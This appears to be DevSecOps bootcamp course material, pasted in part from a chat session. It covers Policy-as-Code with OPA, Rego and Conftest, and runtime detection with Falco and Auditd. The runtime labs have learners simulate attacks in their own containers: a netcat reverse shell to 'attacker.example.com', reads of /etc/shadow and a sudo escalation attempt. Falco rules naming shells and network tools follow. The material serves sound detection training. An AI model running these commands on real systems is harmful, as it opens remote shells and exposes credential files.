- **Gatekeeper** – Kubernetes admission controller for OPA
- **Kyverno** – Native Kubernetes policy engine (optional)
- **Conftest** – For testing policies against IaC (e.g., Terraform)
- ECS IAM policy validation via custom scripts or Conftest
- GitLab/GitHub policy enforcement in CI/CD pipelines

> We'll learn how to express **security rules as code**, validate them in CI/CD, and reject deployments that break rules.

---

## 🧠 Core DevSecOps Concepts

| Concept | Description |
|---------|-------------|
| 📜 Policy-as-Code | Define infrastructure and security rules in code (YAML, Rego) |
| 🧪 Admission Controls | Prevent unauthorized Kubernetes/ECS resources from deploying |
| ✅ Pre-Deployment Checks | Reject IaC or manifests that violate security policies |
| 🔍 Drift Detection | Compare actual config vs. desired state in policies |
| 🧰 OPA / Gatekeeper | Evaluate policies in Kubernetes clusters or pipelines |
| 🔒 Trust Enforcement | Enforce non-root, disallow latest tags, restrict hostPaths |

---

## 🛠️ Tools We’ll Use

| Tool | Purpose |
|------|---------|
| ✅ **OPA** | Define and evaluate policies (Rego language) |
| 🧱 **Gatekeeper** | Kubernetes-native enforcement (CRDs + OPA) |
| 🔐 **Conftest** | Validate IaC (Terraform, YAML, Dockerfile) via OPA |
| 🔧 **Kyverno** (optional) | Easier YAML-native policies for K8s |
| 🧪 **GitHub/GitLab CI** | Run policy checks in pre-merge hooks |
| 📄 **Rego** | Policy language used by OPA and Gatekeeper |

---

## 📦 How the App Evolves

This week, we **codify constraints** for our ECS + Kubernetes environments:

| Area | Policy |
|------|--------|
| ECS Task Definitions | Must drop all `CAP_*`, enforce `non-root` |
| Container Images | Disallow `:latest` tags in production |
| IAM Roles | Must not include wildcard (`*`) actions |
| Terraform Modules | Required tagging, encryption enabled |
| Kubernetes Manifests | Block hostPath, require labels, enforce non-root |
| CI/CD Pipelines | Fail build if policy checks do not pass |

> All policies are tested pre-deploy and enforced at runtime (via admission controls or CI gates).

---

## 🔐 Why Policy-as-Code Matters

In a growing DevOps team or regulated environment, you can’t rely on humans to:

- Remember best practices
- Always write secure Dockerfiles or YAML
- Avoid wildcards in IAM roles

> Policies **codify security**, shift enforcement left, and make decisions repeatable.

---

## 🧠 DevSecOps Tie-In

| Practice | Benefit |
|---------|---------|
| ✅ Automation | Policies run automatically in CI/CD pipelines |
| 🧪 Verification | Test IaC and K8s configs before deploying |
| 🛡️ Security as Code | Teams don’t guess — they follow enforced rules |
| 🔄 Auditable Controls | All policy changes go through Git review |
| ⛔️ Deployment Guardrails | Unsafe changes are blocked early |

---

## 📚 Learning Outcomes

✅ Write security policies in **Rego**  
✅ Use **Conftest** to validate Terraform, Kubernetes YAML, Dockerfiles  
✅ Integrate policy checks into **CI/CD pipelines**  
✅ Enforce rules on ECS task definitions and IAM roles  
✅ Understand how **OPA/Gatekeeper** prevent drift and enforce standards  
✅ Prepare the foundation for **Zero Trust** in deployment and runtime

---

## ✅ Prerequisites

- Basic familiarity with Terraform, YAML, Dockerfile
- GitLab or GitHub pipeline set up (from earlier weeks)
- Local development environment with:
  - Docker
  - OPA CLI
  - Conftest
- Sample IaC code or K8s manifests from earlier bootcamp modules

# 🧪 Guided Lab – Policy-as-Code with OPA, Conftest, and CI/CD Enforcement

---

## 🎯 Objective

You’ll write and apply security policies to catch:
- Use of `:latest` container image tags
- ECS tasks running as `root`
- Overly permissive IAM roles (wildcards)
- Missing tags in Terraform
- Kubernetes manifests that mount host paths or allow privilege escalation

You’ll also:
- Integrate these policies into GitHub Actions or GitLab CI
- Run `conftest` locally and in CI
- Use OPA's Rego language to define your rules

---

## 🧰 Tools You'll Use

| Tool      | Use Case                         |
|-----------|----------------------------------|
| **OPA**   | Core policy engine using Rego    |
| **Conftest** | CLI to test YAML, JSON, HCL   |
| **GitHub Actions / GitLab CI** | Run checks during CI |
| **VS Code Rego Plugin** | (Optional) Syntax highlighting and linting for Rego |

---

## 🛠️ Setup

### 1. Install `conftest`

```bash
# macOS
brew install conftest

# Ubuntu
wget https://github.com/open-policy-agent/conftest/releases/download/v0.45.0/conftest_0.45.0_Linux_x86_64.tar.gz
tar xzf conftest_*.tar.gz
sudo mv conftest /usr/local/bin/
2. Create Policy Directory Structure
mkdir -p policy/docker policy/terraform policy/ecs policy/k8s
OPA will auto-detect policies in these folders.

🚫 Policy 1: Disallow :latest Tags in Dockerfiles
📄 policy/docker/no_latest_tag.rego

package docker.policies

deny[msg] {
  input.Cmd == "FROM"
  endswith(input.Value, ":latest")
  msg := "Do not use :latest tag in production"
}
🧪 Test it:

conftest test Dockerfile
🚫 Policy 2: ECS Task Must Not Run as Root
📄 policy/ecs/no_root.rego

package ecs.policies

deny[msg] {
  input.containerDefinitions[_].user == "root"
  msg := "ECS containers must not run as root"
}
🧪 Test it:

conftest test task-definition.json
🚫 Policy 3: IAM Roles Must Not Have Wildcards
📄 policy/iam/no_wildcards.rego

package iam.policies

deny[msg] {
  action := input.Statement[_].Action
  action == "*"
  msg := "Wildcard IAM actions are not allowed"
}
🧪 Test it:

conftest test iam-role.json
🚫 Policy 4: Terraform Must Include Tags
📄 policy/terraform/must_have_tags.rego

package terraform.policies

deny[msg] {
  not input.resource.aws_instance[_].tags
  msg := "AWS instances must have tags"
}
🧪 Test it:

conftest test main.tf.json
Use terraform show -json > main.tf.json to convert to JSON format.

🚫 Policy 5: Kubernetes Pod Must Not Use hostPath or Allow Privilege Escalation
📄 policy/k8s/secure_pods.rego

package k8s.policies

deny[msg] {
  input.kind == "Pod"
  input.spec.volumes[_].hostPath
  msg := "hostPath is not allowed in Pods"
}

deny[msg] {
  input.spec.containers[_].securityContext.allowPrivilegeEscalation
  msg := "Privileged escalation must be disabled"
}
🧪 Test it:

conftest test pod.yaml
🧪 CI/CD Integration – GitHub Actions Example
📄 .github/workflows/policy-check.yml

name: Policy Checks

on: [push, pull_request]

jobs:
  policy-check:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Install conftest
        run: |
          wget https://github.com/open-policy-agent/conftest/releases/download/v0.45.0/conftest_0.45.0_Linux_x86_64.tar.gz
          tar xzf conftest_*.tar.gz
          sudo mv conftest /usr/local/bin/

      - name: Run policy checks
        run: |
          conftest test Dockerfile
          conftest test ecs/task-definition.json
          conftest test terraform/main.tf.json
          conftest test k8s/pod.yaml
✅ Completion Checklist
Task	Complete?
Installed OPA + Conftest CLI	✅
Created 5 policy files in Rego	✅
Validated real files (Dockerfile, TF, IAM, K8s)	✅
Ran policies via conftest test	✅
Embedded policies into CI/CD pipeline	✅
Can now block insecure config pre-deploy	✅

# 🧪 Guided Lab – Kubernetes & Terraform Policy-as-Code with OPA + Conftest

---

## 🎯 Objectives

You'll enforce policies that:

- Block **privilege escalation** and **hostPath** in Kubernetes
- Require **securityContext** to drop Linux capabilities and run as non-root
- Ensure all **Terraform resources have tags**
- Ensure **S3 buckets are encrypted**
- Test these rules using **conftest**
- Integrate with GitHub Actions or GitLab CI

---

## 🧰 Tooling Recap

| Tool       | Purpose                          |
|------------|----------------------------------|
| `conftest` | CLI to test config files         |
| `rego`     | OPA policy language              |
| `terraform show -json` | Converts plans to JSON for testing |
| `kubectl`  | View cluster manifests (optional) |

---

## 📦 Kubernetes Policy Enforcement

### 1. Block Dangerous Pod Configurations

📄 `policy/k8s/no_privileged.rego`

```rego
package k8s.security

deny[msg] {
  input.kind == "Pod"
  container := input.spec.containers[_]
  container.securityContext.allowPrivilegeEscalation == true
  msg := "Privileged escalation is not allowed"
}

deny[msg] {
  input.kind == "Pod"
  input.spec.volumes[_].hostPath
  msg := "hostPath volumes are not allowed in Pods"
}
✅ Test it:

conftest test k8s/pod.yaml
2. Enforce Hardened Security Context
📄 policy/k8s/hardening.rego

package k8s.hardening

deny[msg] {
  input.kind == "Pod"
  container := input.spec.containers[_]
  not container.securityContext.runAsNonRoot
  msg := "Container must run as non-root"
}

deny[msg] {
  input.kind == "Pod"
  container := input.spec.containers[_]
  not container.securityContext.capabilities.drop[_] == "ALL"
  msg := "All Linux capabilities must be dropped"
}
✅ Test it:

conftest test k8s/hardened-pod.yaml
📦 Terraform Policy Enforcement
1. All AWS Resources Must Have Tags
📄 policy/terraform/require_tags.rego

package terraform.tags

deny[msg] {
  resource := input.resource[_][_]
  not resource.tags
  msg := sprintf("Resource %s must have tags", [resource])
}
✅ Convert TF plan to JSON:

terraform show -json > plan.json
conftest test plan.json
2. S3 Buckets Must Be Encrypted
📄 policy/terraform/s3_encryption.rego

package terraform.security

deny[msg] {
  bucket := input.resource.aws_s3_bucket[_]
  not bucket.server_side_encryption_configuration
  msg := "S3 buckets must have encryption enabled"
}
✅ Run test:

conftest test plan.json
🤖 CI/CD Example – GitHub Actions (Extended for K8s & TF)
📄 .github/workflows/policy-check.yml

name: Policy Checks

on: [push, pull_request]

jobs:
  conftest:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Install conftest
        run: |
          wget https://github.com/open-policy-agent/conftest/releases/download/v0.45.0/conftest_0.45.0_Linux_x86_64.tar.gz
          tar xzf conftest_*.tar.gz
          sudo mv conftest /usr/local/bin/

      - name: Run Conftest for K8s
        run: |
          conftest test k8s/*.yaml

      - name: Convert Terraform plan to JSON
        run: |
          terraform init
          terraform plan -out=tfplan
          terraform show -json tfplan > plan.json

      - name: Run Conftest for Terraform
        run: |
          conftest test plan.json
✅ Completion Checklist

Wrote Rego policies for Kubernetes security	✅
Validated pod YAML for hardening and privilege rules	✅

Embedded tests into CI/CD pipeline	✅

# ⚔️ Challenge Lab – Policy-as-Code in a Real DevSecOps Workflow

---

## 🧩 Scenario

Your team is deploying a new version of the `notes-service` and `auth-service` to Kubernetes. At the same time, you’re onboarding infrastructure via Terraform for S3, IAM, and ECS resources.

Security has mandated the following:

1. **No Kubernetes pods can escalate privileges or use hostPath**
2. **All Terraform resources must include standard tags**
3. **S3 buckets must have server-side encryption enabled**
4. **ECS task definitions must explicitly run as non-root**
5. **No container images should use `:latest` tag**
6. **CI/CD must block all violations pre-deploy**

Your job is to:

✅ Write the necessary **Rego policies**  
✅ Validate your IaC (Terraform) and app manifests (Kubernetes, ECS)  
✅ Configure GitLab/GitHub to **block merges** on failure

---

## 🧪 Tasks

### 🔧 Task 1: Write Kubernetes Hardening Policies

- Require all containers to have `securityContext.runAsNonRoot: true`
- Block any use of `hostPath`
- Prevent `allowPrivilegeEscalation: true`

📄 Save as: `policy/k8s/secure_pods.rego`

---

### 🔧 Task 2: Enforce Terraform Compliance

- Require `tags` on all resources
- Ensure all `aws_s3_bucket` resources include encryption
- Block any IAM policy with `*` in `"Action"`

📄 Save as:
- `policy/terraform/require_tags.rego`
- `policy/terraform/s3_encryption.rego`
- `policy/terraform/no_wildcard_iam.rego`

Use `terraform show -json > plan.json` to generate test input.

---

### 🔧 Task 3: Harden ECS Configs

- Deny if any `containerDefinition.user == "root"`
- Deny if `readonlyRootFilesystem` is not set to `true`

📄 Save as: `policy/ecs/no_root.rego`

Test with your ECS JSON definition file.

---

### 🔧 Task 4: Prevent `:latest` Tags

Write a policy to block the use of `:latest` in Dockerfiles:

```rego
package docker.images

deny[msg] {
  input.Cmd == "FROM"
  endswith(input.Value, ":latest")
  msg := "Do not use the :latest tag in production"
}
📄 Save as: policy/docker/no_latest_tag.rego

🔧 Task 5: CI/CD Policy Gate Integration
Choose either GitHub or GitLab CI below:

✅ GitHub Actions
Extend .github/workflows/policy-check.yml to:

Run conftest test on:

Dockerfile

ECS task definition

Terraform plan (plan.json)

Kubernetes manifests

✅ GitLab CI
stages:
  - test

conftest-policy-check:
  stage: test
  image: alpine
  before_script:
    - apk add --no-cache curl tar
    - curl -L https://github.com/open-policy-agent/conftest/releases/download/v0.45.0/conftest_0.45.0_Linux_x86_64.tar.gz | tar xz
    - mv conftest /usr/local/bin/
  script:
    - conftest test Dockerfile
    - conftest test terraform/plan.json
    - conftest test k8s/
    - conftest test ecs/task-definition.json

# 🔐 Week 13 – Security Deep Dive: Policy-as-Code

---

## 🧠 Why Policy-as-Code Matters

Traditional security practices rely heavily on manual review and tribal knowledge:

- "Don't use `:latest`"
- "Always tag resources"
- "Don’t run containers as root"

But these guidelines are **easy to forget** and **hard to scale**.  
Policy-as-Code transforms security from **suggestion to enforcement**, by encoding rules into version-controlled, testable code.

---

## 🔍 What We're Securing

| Domain       | Risk                                           | PaC Control                              |
|--------------|------------------------------------------------|-------------------------------------------|
| Kubernetes   | Privileged containers, host access             | Rego blocks `hostPath`, privilege escalation |
| ECS          | Running as root, mutable root filesystem       | Rego blocks `user: root`, enforces readonly |
| Terraform    | Missing tags, unencrypted buckets              | Rego enforces metadata and encryption     |
| IAM Policies | Wildcard access (`*`)                          | Rego blocks overly broad permissions      |
| CI/CD        | Undetected drift and misconfigurations         | Policy gates catch violations pre-deploy  |

---

## 🧰 OPA + Rego Security Capabilities

| Feature                    | Description |
|---------------------------|-------------|
| ✅ **Deny-by-default**    | Prevent insecure config automatically |
| 📂 **Modular Rego**       | Reuse policy logic across projects    |
| 🧪 **OPA test**           | Unit-test security logic like application code |
| 🔐 **Admission Control**  | Prevent bad manifests from entering cluster (via Gatekeeper) |
| 📦 **CI/CD Blocking**     | Fail build if security policy is violated |
| 📄 **Versioned Policies** | Track policy evolution alongside app changes |

---

## 📊 Real-World Security Benefits

| Security Practice            | Policy-as-Code Application |
|-----------------------------|----------------------------|
| ✍️ **Secure Coding Standards** | Define policies for config hygiene |
| 🏷️ **Tagging for Governance** | Require tags for cost visibility and traceability |
| 🔒 **IAM Minimization**        | Block overly permissive policies (`*`) |
| 🛡️ **Image Hardening**         | Enforce non-root, deny `:latest`, drop Linux caps |
| 🧼 **Data Hygiene**            | Require S3 encryption, disallow public ACLs |
| 🔁 **Audit Trails**            | All policy decisions are testable, logged, and stored in Git |

---

## 🧠 DevSecOps Alignment

| DevSecOps Principle | Policy-as-Code Impact |
|---------------------|-----------------------|
| Shift Left          | Fail builds at PR/MR time, not runtime |
| Automate Everything | CI runs policies automatically on every change |
| Version Control     | Policy logic stored and tracked in Git |
| Least Privilege     | Policies enforce least privilege in infra/app |
| Compliance-as-Code  | Ready for audits and regulatory reporting |

---

## 📌 Best Practices

- ✅ **Bundle policies with each microservice** (e.g., `services/notes/policies`)
- 📁 **Separate policies by domain** (e.g., `terraform/`, `k8s/`, `ecs/`)
- 🧪 **Write unit tests for policies** using `opa test`
- 🧵 **Document your intent** using policy metadata/comments
- 🔁 **Integrate in all environments**, not just prod
- 🛡️ **Fail builds** on any security violation (use `--fail-on-warn`)
- 🔍 **Review policy changes like code** (pull requests, reviews, approvals)

---

## 🔄 How Policy-as-Code Prevents Drift

PaC ensures that:

- Your Kubernetes manifests conform to cluster standards
- Your Terraform always produces secure, tagged resources
- Your Dockerfiles and ECS configs don’t regress into insecure states

This acts as a **drift prevention mechanism** by making security testable and visible during code review — before merge.

---

## 🧱 Preparing for Zero Trust (Week 17)

These policies form the backbone of:

- Workload isolation
- Identity enforcement
- Resource access control
- Preventing lateral movement

> You can't implement Zero Trust later — you need policy guardrails early on.

---

| Category | Win |
|---------|-----|
| 📋 Governance | Policies codify org-wide security expectations |
| 🧪 Automation | Violations fail in CI/CD pipelines |
| 🔒 Security | Least privilege, hardened workloads, no surprises |
| 🔁 Auditing | Versioned, testable, peer-reviewed policy logic |
| 🧠 Culture | Developers get instant feedback with every commit |

Security is no longer just firewalls and scanners. With Policy-as-Code, **every line of configuration becomes testable**, enforceable, and reviewable — just like your app code.

### 2. **Early Enforcement Prevents Expensive Mistakes**
With tools like `conftest` and OPA:
- You catch insecure `Dockerfile` practices (`:latest`, root) before image build
- You block Terraform resources without tags or encryption before provisioning
- You harden Kubernetes manifests before they ever hit your cluster

### 3. **Modular, Domain-Specific Policies Make Security Scalable**
- Grouping by domain (`k8s/`, `ecs/`, `terraform/`) allows teams to own relevant policies
- Microservices can include service-specific security rules
- Teams can contribute to org-wide policies through version-controlled PRs

### 4. **PaC Bridges Dev and Security**
Instead of relying on after-the-fact audits or checklist reviews, Policy-as-Code helps:
- Developers know the expectations up front
- Security teams codify rules that are testable and traceable
- CI/CD enforces these rules consistently across environments

# 🛡️ Week 14 – Runtime Security with Falco, eBPF & Auditd

---

## 🧠 Core Concept: Runtime Security

Even with secure infrastructure-as-code, hardened containers, and policy gates in CI/CD, **attacks can still happen at runtime**.

> Runtime Security = Observing and alerting on suspicious behavior after an app is deployed and running.

It gives visibility into:
- Unexpected system calls (e.g., netcat inside a container)
- File reads/writes that should never happen (e.g., `/etc/shadow`)
- New processes being spawned inside containers
- Network anomalies or privilege escalation attempts

---

## 🧱 Tools Covered

| Tool     | Purpose |
|----------|---------|
| **Falco**     | Detect suspicious behavior in real-time using syscall rules |
| **eBPF**      | Collect low-overhead runtime data from the Linux kernel |
| **Auditd**    | Track system calls for deeper audit and forensic visibility |
| **Sysdig Inspect** | (Optional) Visualize captured Falco traces interactively |
| **CloudWatch Logs** | Store and alert on runtime events at scale |
| **SIEM Integration** | (e.g., Splunk/Elastic for SOC ops) |

---

## 🎯 Learning Goals

By the end of this week, you’ll be able to:

✅ Detect and alert on container-level threats in real time  
✅ Write custom Falco rules for your application behavior  
✅ Integrate Falco into ECS and Kubernetes workloads  
✅ Understand how eBPF enables observability without agents  
✅ Use Auditd for historical forensic logs of system access  
✅ Forward alerts to centralized systems (CloudWatch, SIEMs)

---

## 🔐 DevSecOps Tie-In

| DevSecOps Principle | Runtime Security Mapping |
|---------------------|--------------------------|
| 🧪 Detect anomalies | Falco monitors syscalls live in containers |
| 📦 App awareness   | Rules are tailored to your microservices' expected behavior |
| 🔁 Feedback loop   | Alerts inform future hardening & policy improvements |
| 🧠 Least privilege | Detect if workloads violate expected behavior or access |
| 📊 Continuous Monitoring | Alerts can trigger response automation |

---

## 🧩 How This Evolves the App

This week, you’ll:

- Attach **Falco sidecars** to services like `notes-service` and `auth-service`
- Define **custom Falco rules** per service:
  - e.g., "Auth-service should never spawn `bash`"
- Use **CloudWatch or a SIEM** to store and review alerts
- Simulate intrusion behavior (e.g., reverse shell, base64 decoding, etc.)
- Optionally pipe into an **automated blocking system** using EventBridge or AWS Lambda

---

## 🧠 Theory Snapshot: What is eBPF?

**eBPF (Extended Berkeley Packet Filter)** lets you run sandboxed programs inside the Linux kernel to safely and efficiently observe (or block) kernel-level events.

It powers modern observability tools like:
- Cilium (network policies)
- Falco (runtime detection)
- BCC/bpftrace (kernel tracing)

Why it matters:  
> eBPF enables deep visibility **without modifying your app** or container.

---

## 🔄 Integration Plan

You’ll add **runtime detection** to your existing services like this:

+------------------------+

Auth Service (Pod)
Node.js App
AWS SDK + IAM
Falco Sidecar 🔍
+------------------------+
    👇 alerts

[CloudWatch Logs]
         ↓
[EventBridge Rule]
         ↓
  [SNS / Slack / SIEM]

---

## 📘 Real-World Relevance

Runtime detection is critical for:

- **Zero-day threats** bypassing static analysis
- **Insider threats or compromised workloads**
- **Red team simulations**
- Meeting compliance like **PCI DSS**, **SOC 2**, **HIPAA**

# 🛡️ Guided Lab – Runtime Threat Detection with Falco, eBPF, and Auditd

---

## 🎯 Lab Goals

- ✅ Deploy Falco in Kubernetes and ECS environments
- ✅ Write custom Falco rules to monitor your app’s runtime behavior
- ✅ Simulate container misuse (e.g., reverse shell, netcat, file access)
- ✅ Route Falco alerts to CloudWatch or your local terminal
- ✅ Understand how Falco uses eBPF and kernel-level hooks

---

## 🧪 Part 1: Falco on Kubernetes

### 🧰 Step 1: Install Falco (Helm)

```bash
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo update

helm install falco falcosecurity/falco \
  --namespace falco --create-namespace
🔍 Falco installs as a DaemonSet to monitor all pods on the node. It uses eBPF probes to capture syscalls with minimal overhead.

🔎 Step 2: View Live Alerts
kubectl logs -n falco -l app=falco -f
Try the following inside a pod:

kubectl exec -it deployment/notes-service -- bash
echo "hacked" > /tmp/hack.txt
Falco should alert on:

Shell spawned

File write in /tmp

🛠️ Step 3: Add a Custom Rule
Create custom-rules/falco-notes.yaml:

- rule: Unexpected Shell in Notes Service
  desc: Detect bash or sh shells in the notes service
  condition: container.name = "notes-service" and proc.name in ("bash", "sh")
  output: "Shell detected in notes-service (user=%user.name command=%proc.cmdline)"
  priority: WARNING
  tags: [container, shell, notes]
Apply:

kubectl create configmap falco-custom-rules \
  --from-file=custom-rules/ -n falco --dry-run=client -o yaml | kubectl apply -f -
kubectl rollout restart daemonset falco -n falco
🐳 Part 2: Falco on ECS (Fargate or EC2)
☁️ Step 1: Deploy a Sidecar or Use ECS EC2
ECS Fargate lacks full kernel access — so runtime detection is limited. For best visibility, use EC2 with ECS agent + Falco DaemonSet.

On ECS EC2:

Install Falco agent inside an EC2 instance (or sidecar with privileged access)

Or stream container logs to CloudWatch and use Falco as a centralized processor

🔥 Step 2: Simulate an Attack in ECS
Attach an interactive session to a task

Run:

nc -lvp 4444  # simulate reverse shell
cat /etc/shadow
These should trigger:

Suspicious port listen

Sensitive file read

📡 Part 3: Alert Routing
✅ Option 1: Local Logging (Dev)
Alerts appear in:

/var/log/falco.log
☁️ Option 2: CloudWatch Logging (ECS/K8s)
Edit Falco config:

program_output:
  enabled: true
  keep_alive: false
  program: "logger -p user.warning"
Ensure your system or container forwards logs to CloudWatch Logs.

🔁 Option 3: SNS/SIEM
Use falcosidekick to route alerts to:

Slack

SNS

Splunk

CloudEvent/Webhook endpoints

Deploy sidekick via:

helm install falcosidekick falcosecurity/falcosidekick \
  --namespace falco --set config.slack.webhookurl="https://hooks.slack.com/..."
📜 Part 4: Auditd (Bonus – Forensics)
Auditd helps with post-event forensics:

sudo apt install auditd -y
sudo auditctl -w /etc/passwd -p wa
This will log write attempts to /etc/passwd.

Check logs:

ausearch -f /etc/passwd
✅ Completion Checklist
✅ Task	Description
🧱 Deployed Falco in K8s or ECS	
🔔 Verified live alerts on shell or file access	
✍️ Wrote at least 1 custom detection rule	
☁️ Routed alerts to logs or Slack	
🔍 Understood syscall, eBPF, and probe behavior	
📊 Optional: Used auditd for forensic logging	
🧠 Observability Insight
Runtime threats are rare but high-impact. Falco helps catch the “unknown unknowns” that static tools miss — especially in Zero Trust or regulated environments.

# 🧨 Challenge Lab – Runtime Threat Simulation & Automated Response

---

## 🎯 Scenario: Compromised Notes Service Container

You receive an alert from Falco indicating that the `notes-service` container is behaving suspiciously. Your goal is to:

1. ✅ Simulate a breach in the container
2. 🧠 Triage and analyze the Falco alert
3. ⚡ Create an automated alert → response chain using EventBridge or Webhook
4. 🧰 (Bonus) Patch the container image or deployment to prevent future breach

---

## 🧱 Setup

You should have:
- Falco running in Kubernetes (or ECS with CloudWatch logs)
- Notes-service deployed with shell access
- Falcosidekick or logging pipeline set up

---

## 🐍 Step 1: Simulate Malicious Behavior

SSH into your Kubernetes worker node or ECS task (or use `kubectl exec`):

```bash
kubectl exec -it deployment/notes-service -- bash
Inside the container:

# Attempt privilege escalation
whoami
sudo su -          # if sudo is installed

# Access sensitive data
cat /etc/passwd
cat /etc/shadow    # will likely fail but log attempt

# Establish a reverse shell
apt update && apt install netcat -y
nc attacker.example.com 4444 -e /bin/bash
💥 These actions should trigger multiple Falco alerts:

Shell spawned

Sensitive file read

Outbound reverse shell attempt

🔔 Step 2: Triage the Alert
Tail Falco logs:

kubectl logs -n falco -l app=falco -f
You should see output like:

Shell detected in notes-service (user=root command=bash)
Sensitive file read: /etc/shadow
Network connection to unknown IP
Log

ChatGPT said:

📁 Week14/ChallengeLab.md (continued)
---

## 📋 Step 3: Analyze the Alert Metadata

Each Falco alert includes rich context:

```json
{
  "time": "2025-07-27T18:33:23Z",
  "output": "Shell detected in notes-service (user=root command=bash)",
  "priority": "WARNING",
  "rule": "Unexpected Shell in Notes Service",
  "container": {
    "name": "notes-service",
    "image": "mycompany/notes:latest",
    "id": "abc123"
  },
  "hostname": "ip-10-0-1-123"
}
Use this metadata to:

Determine which container/image triggered the alert

Identify the exact command executed

Confirm user privilege

Correlate the event with logs in CloudWatch/ELK

⚡ Step 4: Auto-Respond Using AWS EventBridge + Lambda
If Falco sends logs to CloudWatch, you can use EventBridge to trigger a response.

A. Create EventBridge Rule
Match pattern in the log stream:

{
  "source": ["falco"],
  "detail-type": ["Falco Alert"],
  "detail": {
    "rule": ["Unexpected Shell in Notes Service"]
  }
}
You can also use text match like command=bash if you’re parsing plain logs.

B. Attach Lambda Target
This Lambda can:

Stop the ECS task or Kubernetes pod

Quarantine the instance

Trigger an SNS or Slack alert

Example Lambda (Python):
import boto3

def lambda_handler(event, context):
    ecs = boto3.client('ecs')
    print("Received event:", event)
    
    # Replace with your cluster and task ID logic
    response = ecs.stop_task(
        cluster='my-app-cluster',
        task='failing-task-id',
        reason='Falco Alert: Unexpected Shell Detected'
    )
    return {"status": "task stopped"}
🔒 Secure the Lambda with IAM permissions: ecs:StopTask, logs:FilterLogEvents, etc.

🧩 Optional: Kubernetes Auto-Remediation
If using Kubernetes:

Deploy Kyverno or OPA Gatekeeper with a policy like:

apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: deny-shell-in-containers
spec:
  validationFailureAction: enforce
  rules:
    - name: deny-shell
      match:
        resources:
          kinds: ["Pod"]
      validate:
        message: "Bash is not allowed in container images."
        pattern:
          spec:
            containers:
              - =(command): "!*bash*"
This prevents future workloads with bash as entrypoint.

🛠️ Step 5: Patch the Service
Update your Dockerfile or entrypoint script for notes-service to:

Remove unnecessary binaries (bash, nc, curl)

Set a non-root user in Dockerfile:

FROM node:18-alpine
RUN addgroup app && adduser -S -G app app
USER app
Drop Linux capabilities:

securityContext:
  runAsNonRoot: true
  capabilities:
    drop:
      - ALL
Redeploy your hardened service.

🛡️ Hardened Dockerfile and k8s manifest for notes-service

🧠 Pro Tips
Tailor rules to per-service expectations

Avoid alert fatigue by fine-tuning priority, scope, and frequency

Use sidekick dashboards or route to Elastic/SIEM for threat correlation

Combine Falco with CloudTrail + GuardDuty for full-stack visibility

# 🔐 Week 14 Security Deep Dive – Runtime Detection with Falco, eBPF & Auditd

---

## 🎯 Goal

Understand how Falco uses eBPF, syscall hooks, and rule engines to detect malicious behavior in containers, and how that fits into a layered DevSecOps security model.

---

## 🧠 What is eBPF and Why Does It Matter?

### 🔍 eBPF = Extended Berkeley Packet Filter

eBPF allows you to run sandboxed programs in the Linux kernel **without modifying kernel source or modules**.

It enables:

- Real-time visibility into **syscalls**, **network activity**, **file access**
- **Low overhead** collection vs traditional agents
- **Safe execution** (verified before loading)

Falco uses eBPF to observe:
- `open()`, `execve()`, `bind()`, `chmod()` syscalls
- Process trees, environment variables, and command lines
- Container boundaries and image metadata

---

## 🦅 How Falco Works

### 1. **Capture**

Falco uses one of two drivers:
- Kernel Module (faster, but invasive)
- eBPF Probe (safer, portable, and modern)

It captures **syscalls** on the host and correlates them with container metadata.

### 2. **Filter**

It filters syscalls through customizable **rules** written in YAML.

Example Rule:
```yaml
- rule: Write Below /etc
  desc: Unexpected file write below /etc
  condition: evt.type=write and fd.name startswith /etc
  output: "Write below /etc by %user.name (command=%proc.cmdline)"
  priority: WARNING
3. Alert
It sends an alert:

Locally (/var/log/falco.log)

To a centralized logging system (CloudWatch, Elastic, etc.)

To falcosidekick → Slack, SIEMs, Webhooks

📦 What Falco Monitors
Event Type	Description
File Access	/etc/shadow, /tmp/exploit.sh, etc.
Process Execution	bash, nc, wget, curl, chmod +s
Network Activity	Outbound to unknown IPs, reverse shells
User Privilege	Sudo use, new users, UID switches
Container Lifecycle	Container start, exec, kill
🔬 What Auditd Offers
Auditd = Linux’s built-in syscall auditing framework.

Use it for:

Forensic logs of access to sensitive files

Compliance-driven audit trails (HIPAA, PCI)

Long-term archival of syscalls

But unlike Falco, Auditd is not real-time and has a steeper config curve.

📊 Security Benefits
🔐 Security Principle	Falco Mapping
Least Privilege	Alert on privilege escalation
Defense in Depth	Adds runtime layer beyond static scanning
Visibility & Monitoring	Observes all containers and syscalls
Incident Response	Real-time alert triage
Zero Trust Runtime	Alerts on unexpected process behavior
🧩 ECS Considerations
ECS Fargate does not support privileged containers, so Falco can’t run inside the task

Instead:

Use Falco on ECS EC2 clusters

Forward container logs to CloudWatch

Parse logs with EventBridge + Lambda for detection

Fargate limitations mean Falco is best used in dev, staging, or EC2-based clusters for deep inspection.

🔐 Rule Writing Best Practices
Write per-service policies (e.g., auth-service shouldn’t curl)

Use container.name, proc.cmdline, user.name

Use priority: ERROR or CRITICAL for real threats

Group rules into policy packs (e.g., filesystem.yaml, network.yaml)

🚨 Limitations
Challenge	Workaround
False positives	Tune rules by service
High verbosity	Route alerts to SIEM, aggregate
Fargate no support	Use logging-based detection or switch to EC2
No enforcement	Combine with OPA/Kyverno to block workloads
🛡️ Integration with Other DevSecOps Layers
Layer	Example
SBOM & Image Scan	Detects known CVEs before runtime
Policy-as-Code	Blocks insecure config before deploy
Runtime Security (Falco)	Detects container abuse or shell access
Monitoring & Alerts	Routes Falco alerts to DevSecOps dashboards
Response Automation	Triggers pod deletion, network quarantine
🧠 Summary
Falco gives you kernel-level visibility into what’s happening inside your containers and hosts.

It acts as a real-time SIEM sensor inside Kubernetes and ECS EC2

Helps catch zero-day behavior, insider threats, and misconfigured services

Complements IaC security, image scanning, and CI/CD policy enforcement

If you're building a Zero Trust DevSecOps architecture, Falco is a core building block.

# 🧠 Week 14 Reflection – Runtime Security with Falco, eBPF & Auditd

---

## 🔄 What You Implemented

✅ Deployed **Falco** in Kubernetes (and optionally ECS EC2)  
✅ Wrote **custom syscall detection rules** per microservice  
✅ Simulated **real-world attacks** (reverse shell, file access, privilege misuse)  
✅ Configured **alerts to CloudWatch / Sidekick → Slack**  
✅ (Bonus) Used **Auditd** for forensic-level syscall logging  
✅ Hardened your container and deployment specs  
✅ Explored **EventBridge + Lambda auto-response** patterns

---

## 🧠 Key Takeaways
